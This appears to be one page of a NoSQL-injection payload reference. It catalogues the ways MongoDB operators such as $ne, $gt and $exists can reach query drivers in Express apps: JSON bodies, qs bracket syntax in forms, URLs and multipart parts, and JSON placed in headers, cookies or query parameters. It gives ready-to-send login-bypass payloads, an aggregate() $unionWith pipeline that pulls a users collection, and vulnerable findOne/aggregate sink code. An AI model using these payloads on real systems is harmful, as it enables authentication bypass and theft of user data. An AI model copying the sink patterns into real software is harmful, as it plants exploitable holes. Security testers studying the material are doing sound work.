# Injection points — where the object survives

## The JSON body — `Content-Type: application/json`

```text
POST /login
Content-Type: application/json

{"user": {"$ne": null}, "pass": {"$ne": null}}
```

The cleanest carrier — the JSON object survives as an object into the
driver — `detection.md`.

## The form array-syntax — `user[$ne]=x`

```text
POST /login
Content-Type: application/x-www-form-urlencoded

user[$ne]=x&pass[$ne]=x
```

`qs` (Express's parser) turns `user[$ne]=x` into `{user: {$ne: "x"}}` —
the `$`-operator carrier through a URLENCODED form — no JSON needed.

## The bracket-syntax — `user[$ne]`/`user[pass][$ne]`

```text
user[$ne]=x
user[pass][$ne]=x
filter[user][$gt]=
q[user][$ne]=x
data[user][$ne]=x
credentials[0][user][$ne]=x
```

Each bracket-depth nests the object — `qs` builds the nested shape —
the app's `req.body.user` / `req.body.filter.user` / `req.body.q.user`
receives the object — `detection.md`.

## The query-param — `?user[$ne]=x` in the URL

```text
GET /search?user[$ne]=x&pass[$ne]=x
GET /search?filter[user][$ne]=x
```

The query-string's `qs` parsing — same array-syntax — a GET-carrier.

## The nested-JSON — `{"filter": {"user": {"$gt": ""}}}`

```json
{"filter": {"user": {"$gt": ""}}}
{"query": {"user": {"$ne": null}}}
{"where": {"user": {"$exists": true}}}
{"data": {"credentials": {"user": {"$ne": null}}}}
{"0": {"user": {"$ne": null}}}
{"credentials": [{"user": {"$ne": null}}]}
```

The object inside a named field — the app's `req.body.filter` reaches
`find()` — the nested carrier.

## The array-body — `[{"$match": {...}}]` → `aggregate()`

```text
POST /api/search
Content-Type: application/json

[{"$limit":1},{"$unionWith":"users"}]
```

An ARRAY body may reach `aggregate()` — `aggregation.md`.

## The header-carrier — `X-Filter: {"user": {"$ne": null}}`

```text
X-Filter: {"user": {"$ne": null}}
```

A header that the app parses as JSON — the header-carrier.

## The cookie-carrier — `session={"user": {"$ne": null}}`

```text
Cookie: session={"user": {"$ne": null}}
```

A cookie the app parses as JSON.

## The param-embedded — `?filter={"user":{"$ne":null}}`

```text
GET /search?filter={"user":{"$ne":null}}
```

A JSON-string inside a query-param — the app `JSON.parse`s it —
the string-embedded carrier.

## The multipart — `user[$ne]` inside a form-data part

```text
Content-Type: multipart/form-data; boundary=X

------X
Content-Disposition: form-data; name="user[$ne]"

x
```

The `qs`-parser in multipart — the `$`-operator carrier.

## The driver-reach — which sinks the object hits

```javascript
User.findOne({username: req.body.user})     — the object into find()
User.findOne(req.body)                       — the whole body as the filter
db.collection('u').find({user: req.body.q})  — the named-field
User.aggregate(req.body.pipeline)            — the array → aggregate
User.updateOne({user: req.body.user}, {$set: ...})  — the update-filter
```

## The content-type confusion — `application/json` vs `application/x-www-form-urlencoded`

- `application/json` → `{"user": {"$ne": null}}` — the object
- `application/x-www-form-urlencoded` → `user[$ne]=x` — the qs-object

Both reach the driver — the parser determines the carrier —
`detection.md`.

## The qs-parser's depth — `qs.parse("a[b][c]=x")`

`qs` nests — `a[b][c]=x` → `{a:{b:{c:"x"}}}` — a depth-N object — the
deeper the carrier, the deeper the object — Express's `extended` parser.
